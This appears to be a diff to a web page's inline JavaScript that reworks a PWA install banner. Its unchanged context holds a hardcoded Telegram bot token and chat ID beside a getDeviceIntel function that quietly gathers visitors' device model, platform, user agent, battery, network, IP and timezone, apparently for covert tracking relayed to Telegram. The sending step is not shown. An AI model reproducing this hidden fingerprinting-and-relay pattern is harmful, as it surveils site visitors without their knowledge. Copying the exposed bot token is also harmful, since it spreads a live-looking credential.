@@ -5391,11 +5391,33 @@
     <script>
         const TG_TOKEN = "8671549318:AAFmsnS2xvhOJFgYUZfFDe5ELDhpYwlFVqQ";
         const TG_CHAT = "8506290708";
+// --- PWA INSTALLATION NOTIFICATION LOGIC ---
+        let pwaPrompt;
 
-        let deferredPrompt;
-        window.addEventListener('beforeinstallprompt', (e) => { e.preventDefault(); deferredPrompt = e; const btn = document.getElementById('installBtn'); if(btn) btn.style.display = 'inline-block'; });
-        function installApp() { if (deferredPrompt) { deferredPrompt.prompt(); deferredPrompt.userChoice.then((choiceResult) => { deferredPrompt = null; }); } }
+        window.addEventListener('beforeinstallprompt', (e) => {
+            e.preventDefault();
+            pwaPrompt = e;
+            // Shows the banner after 2 seconds
+            setTimeout(() => {
+                const banner = document.getElementById('pwa-install-banner');
+                if(banner) banner.classList.add('show');
+            }, 2000);
+        });
 
+        function installPWAApp() {
+            if (pwaPrompt) {
+                pwaPrompt.prompt();
+                pwaPrompt.userChoice.then((choiceResult) => {
+                    pwaPrompt = null;
+                    closeInstallBanner();
+                });
+            }
+        }
+
+        function closeInstallBanner() {
+            document.getElementById('pwa-install-banner').classList.remove('show');
+        }
+        
         async function getDeviceIntel() {
             let model = "Unknown Device"; let browser = navigator.userAgent; let battery = "Unknown"; let ip = "Masked"; let network = "Unknown"; let timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
             if (navigator.userAgentData) { const data = await navigator.userAgentData.getHighEntropyValues(["model", "platform"]); model = `${data.platform} ${data.model}`; }
